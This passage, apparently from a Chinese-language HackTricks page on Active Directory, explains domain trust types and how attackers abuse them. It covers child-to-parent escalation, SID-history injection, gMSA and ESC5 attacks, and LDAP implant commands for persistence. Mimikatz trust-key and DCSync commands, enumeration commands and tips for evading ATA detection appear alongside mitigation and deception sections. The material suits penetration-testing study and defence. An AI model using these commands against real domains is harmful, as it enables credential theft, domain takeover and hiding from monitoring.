6. DC2 使用其共享的 trust key 验证 inter-realm TGT，如果有效，则为客户端想要访问的 Domain 2 中的服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，客户端将此 TGS 提交给服务器，该票证使用服务器账户的 hash 加密，以访问 Domain 2 中的服务。

### 不同的 trusts

重要的是要注意，**a trust can be 1 way or 2 ways**。在双向选项中，两个域将相互信任，但在 **1 way** 的信任关系中，一个域将是 **trusted**，另一个是 **trusting**。在后一种情况下，**你只能从 trusted 域访问 trusting 域内的资源**。

如果 Domain A trusts Domain B，则 A 是 trusting domain，B 是 trusted domain。此外，在 **Domain A** 中，这将是一个 **Outbound trust**；在 **Domain B** 中，这将是一个 **Inbound trust**。

**不同的信任关系**

- **Parent-Child Trusts**：这是同一森林内的常见设置，子域会自动与其父域具有双向传递信任。本质上，这意味着认证请求可以在父域和子域之间无缝流动。
- **Cross-link Trusts**：也称为 "shortcut trusts"，这些在子域之间建立以加快引用过程。在复杂的森林中，认证引用通常必须向上到森林根，然后再向下到目标域。通过创建 cross-links，可以缩短这一旅程，这在地理分散的环境中特别有用。
- **External Trusts**：这些在不同且无关联的域之间建立，且本质上是 non-transitive 的。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 对访问位于当前森林之外、且没有通过 forest trust 连接的域的资源很有用。通过对 external trusts 进行 SID filtering，可增强安全性。
- **Tree-root Trusts**：这些信任会在森林根域和新添加的 tree root 之间自动建立。尽管不常见，tree-root trusts 对于向森林添加新的域树很重要，使其能够保持唯一的域名并确保双向传递性。更多信息可参见 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这种类型的 trust 是在两个 forest root domains 之间的双向传递信任，同时亦执行 SID filtering 以增强安全措施。
- **MIT Trusts**：这些信任与非 Windows 的、符合 [RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立。MIT trusts 更为专业，适用于需要与 Windows 生态之外的基于 Kerberos 的系统集成的环境。

#### 在 **trusting relationships** 中的其他差异

- 信任关系也可以是 **transitive**（A trust B，B trust C，则 A trust C）或 **non-transitive**。
- 信任关系可以设置为 **bidirectional trust**（双方互相信任）或 **one-way trust**（仅一方信任另一方）。

### 攻击路径

1. **Enumerate** 信任关系
2. 检查是否有任何 **security principal**（user/group/computer）对 **other domain** 的资源有 **access**，可能通过 ACE 条目或成为另一个域的组成员。查找 **relationships across domains**（可能就是为此创建了信任）。
1. 在这种情况下，kerberoast 也可能是另一个选项。
3. **Compromise** 可以 **pivot** 通过域的 **accounts**。

攻击者可以通过三种主要机制访问另一个域的资源：

- **Local Group Membership**：principals 可能被添加到机器上的本地组，例如服务器上的 “Administrators” 组，从而授予他们对该机器的重大控制权。
- **Foreign Domain Group Membership**：principals 也可以成为外域中的组成员。然而，这种方法的有效性取决于信任的性质和组的作用范围。
- **Access Control Lists (ACLs)**：principals 可能在 **ACL** 中被指定，特别是在 **DACL** 的 **ACEs** 中，赋予他们对特定资源的访问。想深入了解 ACL、DACL 和 ACE 工作机制的人，可以参考白皮书 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 。

### 查找具有权限的外部用户/组

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来查找域中的外部安全主体。这些将是来自 **an external domain/forest** 的用户/组。

你可以在 **Bloodhound** 中检查，或使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任的其他方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 有 **2 个受信任的密钥**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以使用以下命令查看当前域使用的密钥：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

滥用信任并使用 SID-History injection 将权限提升为对 child/parent domain 的 Enterprise admin：

{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

理解如何利用 Configuration Naming Context (NC) 十分关键。Configuration NC 在 Active Directory (AD) 环境中作为整个林（forest）配置数据的中央存储库。此数据会复制到林中的每个 Domain Controller (DC)，可写的 DC 会保留 Configuration NC 的可写副本。要利用这一点，需要在某个 DC 上拥有 **SYSTEM privileges on a DC**，最好是一个 child DC。

**Link GPO to root DC site**

Configuration NC 的 Sites 容器包含有关 AD 林内所有加入域的计算机站点的信息。通过在任一 DC 上以 SYSTEM 权限操作，攻击者可以将 GPOs 链接到 root DC site。此操作可能通过操控应用到这些站点的策略来危及 root domain。

有关深入信息，可参考对 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) 的研究。

**Compromise any gMSA in the forest**

一种攻击向量是针对域内的特权 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。在任一 DC 上以 SYSTEM 权限时，可以访问 KDS Root key 并计算林内任何 gMSA 的密码。

详细分析和逐步指导见：

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的 delegated MSA 攻击（BadSuccessor —— 滥用 migration 属性）：

{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

附加外部研究：[Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)。

**Schema change attack**

此方法需要耐心，等待创建新的特权 AD 对象。拥有 SYSTEM 权限后，攻击者可以修改 AD Schema，赋予任意用户对所有类的完全控制权。这可能导致对新创建的 AD 对象的未授权访问和控制。

更多内容可参见 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)。

**From DA to EA with ADCS ESC5**

ADCS ESC5 漏洞针对对 PKI 对象的控制，用以创建允许以林内任意用户身份进行身份验证的证书模板。由于 PKI 对象位于 Configuration NC，攻陷一个可写的 child DC 即可执行 ESC5 攻击。

更多细节见 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)。在没有 ADCS 的情况下，攻击者也能够搭建所需组件，详见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在此场景中，**你的域被外部域信任**，从而赋予你对其的**未确定权限**。你需要找出**你的域中的哪些主体对外部域具有哪些访问权限**，然后尝试利用它：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部林域 - 单向（出站）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在这个场景中，**你的域** 正在 **信任** 来自 **不同域** 的主体以授予一些 **权限**。

然而，当一个 **域被信任**（by the trusting domain）时，被信任的域会 **创建一个用户**，该用户具有 **可预测的名称**，并使用 **受信任的密码** 作为其密码。这意味着可以 **利用来自信任域的用户访问被信任域**，进入其中进行枚举并尝试提升更多权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种攻破被信任域的方法是找到在域信任的**相反方向**上创建的 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这种情况并不常见）。

另一种攻破被信任域的方法是等待在一台 **受信任域用户可以通过 RDP 登录** 的机器上。然后，攻击者可以在 RDP 会话进程中注入代码，并从那里 **访问受害者的源域**。\
此外，如果 **受害者已挂载其硬盘**，攻击者可以从 **RDP 会话** 进程将 **后门** 存放到 **硬盘的启动文件夹**。该技术称为 **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用的缓解措施

### **SID Filtering:**

- 利用 SID history 属性跨林信任进行攻击的风险可以通过 SID Filtering 降低，SID Filtering 在所有 inter-forest trusts 上默认启用。其前提是假设 intra-forest trusts 是安全的，Microsoft 将 forest（而非 domain）视为安全边界。
- 不过需要注意的是：SID filtering 可能会干扰应用程序和用户访问，因此有时会被禁用。

### **Selective Authentication:**

- 对于 inter-forest trusts，采用 Selective Authentication 可确保来自两个 forest 的用户不会被自动认证。相反，用户需要明确的权限才能访问信任域或信任林内的域和服务器。
- 需要注意的是，这些措施无法防止对可写的 Configuration Naming Context (NC) 的利用或对信任帐户的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD-style 的 LDAP 原语重新实现为完全在主机内植入程序（例如 Adaptix C2）内运行的 x64 Beacon Object Files。操作人员通过 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该包，加载 `ldap.axs`，然后在 beacon 中调用 `ldap <subcommand>`。所有流量都以当前登录的安全上下文通过 LDAP (389)（带 signing/sealing）或 LDAPS (636)（自动证书信任）传输，因此无需使用 socks 代理或在磁盘上留下痕迹。

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` 将短名/OU 路径解析为完整 DN 并转储相应对象。
- `get-object`, `get-attribute`, and `get-domaininfo` 提取任意属性（包括安全描述符）以及来自 `rootDSE` 的林/域元数据。
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` 直接从 LDAP 暴露出 roasting 候选项、委派设置和现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 描述符。
- `get-acl` and `get-writable --detailed` 解析 DACL，列出受托人、权限（GenericAll/WriteDACL/WriteOwner/属性写入）和继承情况，为 ACL 权限提升提供直接目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 写入原语用于 提权 和 持久化

- 对象创建 BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 允许操作者在存在 OU 权限的任何位置部署新的主体或机器账号。`add-groupmember`, `set-password`, `add-attribute`, 和 `set-attribute` 一旦获得 write-property 权限即可直接劫持目标。
- 以 ACL 为中心的命令，例如 `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, 和 `add-dcsync` 将任何 AD 对象上的 WriteDACL/WriteOwner 转化为密码重置、组成员控制或 DCSync 复制权限，而不会留下 PowerShell/ADSI 痕迹。对应的 `remove-*` 命令用于清理注入的 ACEs。

### Delegation、roasting 与 Kerberos 滥用

- `add-spn`/`set-spn` 立即使被攻陷的用户变得 Kerberoastable；`add-asreproastable`（UAC 切换）将在不触及密码的情况下标记其可进行 AS-REP roasting。
- Delegation 宏（`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`）可从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，启用 constrained/unconstrained/RBCD 攻击路径，并消除对远程 PowerShell 或 RSAT 的需求。

### sidHistory 注入、OU 迁移与攻击面塑造

- `add-sidhistory` 将特权 SID 注入受控主体的 SID history（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 提供隐蔽的访问继承。
- `move-object` 更改计算机或用户的 DN/OU，允许攻击者将资产拖入已有委派权限的 OU，然后再滥用 `set-password`, `add-groupmember`, 或 `add-spn`。
- 有严格范围的移除命令（`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` 等）允许操作者在获取凭证或持久化后迅速回滚，从而将遥测最小化。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **凭证保护的防御措施**

- **Domain Admins Restrictions**: 建议 Domain Admins 仅被允许登录到 Domain Controllers，避免在其他主机上使用。
- **Service Account Privileges**: 服务不应以 Domain Admin (DA) 权限运行以维持安全性。
- **Temporal Privilege Limitation**: 对于需要 DA 权限的任务，应限制其持续时间。可通过以下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **实施欺骗技术**

- 实施欺骗涉及设置陷阱，例如诱饵用户或计算机，具有诸如密码不失效或被标记为 Trusted for Delegation 等特性。详细方法包括创建具有特定权限的用户或将其添加到高权限组中。
- 一个实用示例涉及使用如下工具：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署欺骗技术的更多信息，请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)。

### **识别欺骗**

- **For User Objects**: 可疑指示器包括异常的 ObjectSID、低频的登录、创建日期以及较低的错误密码计数。
- **General Indicators**: 将潜在诱饵对象的属性与真实对象进行比较可以揭示不一致之处。像 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 这样的工具可以帮助识别此类欺骗。

### **绕过检测系统**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: 避免在 Domain Controllers 上进行会话枚举以防止 ATA 检测。
- **Ticket Impersonation**: 使用 **aes** 密钥创建票据有助于规避检测，因为不会降级到 NTLM。
- **DCSync Attacks**: 建议从非 Domain Controller 执行以避免 ATA 检测，因为直接在 Domain Controller 上执行会触发警报。

## 参考资料

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
